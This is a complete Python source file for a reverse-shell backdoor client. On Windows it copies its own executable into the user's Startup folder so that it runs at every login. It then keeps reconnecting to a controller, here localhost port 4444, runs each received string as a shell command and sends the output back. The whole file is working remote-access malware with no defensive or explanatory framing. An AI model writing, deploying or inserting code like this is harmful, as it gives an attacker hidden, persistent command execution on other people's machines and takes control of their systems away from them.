import socket
import subprocess
import os
import shutil
import sys
import struct

class Client:
    def __init__(self, host, port):
        if hasattr(sys, "_MEIPASS"):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(__file__)

        if os.name == "nt":
            appdata = os.getenv("APPDATA")

            path = os.path.join(
                appdata,
                "Microsoft",
                "Windows",
                "Start Menu",
                "Programs",
                "Startup",
                os.path.basename(exe_path),
            )

            if not os.path.exists(path):
                shutil.copyfile(exe_path, path)

        self.host = host
        self.port = port
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.settimeout(30)  # 30 second timeout
        self.client.connect((self.host, self.port))

    def send(self, data: bytes):
        length = struct.pack("!I", len(data))
        self.client.sendall(length + data)

    def receive(self):
        raw_length = self.client.recv(4)
        if not raw_length:
            return None
        length = struct.unpack("!I", raw_length)[0]
        return self._receiveAll(length)
    
    def _receiveAll(self, n):
        data = b""
        while len(data) < n:
            part = self.client.recv(n - len(data))
            if not part: return None
            data += part
        return data

client = None

def connect():
    global client
    while client is None:
        try:
            client = Client("localhost", 4444)
        except Exception:
            pass

connect()

while True:
    try:

        command = client.receive()

        if command is None:
            continue

        output = subprocess.run(
            command.decode("utf-8"),
            shell=True,
            text=True,
            capture_output=True,
        )
        output = (output.stderr or output.stdout or "").strip()

        if not output:
            output = "Command executed successfully"

        
        client.send(output.encode("utf-8"))
       
    except Exception as e:
        client = None
        connect()
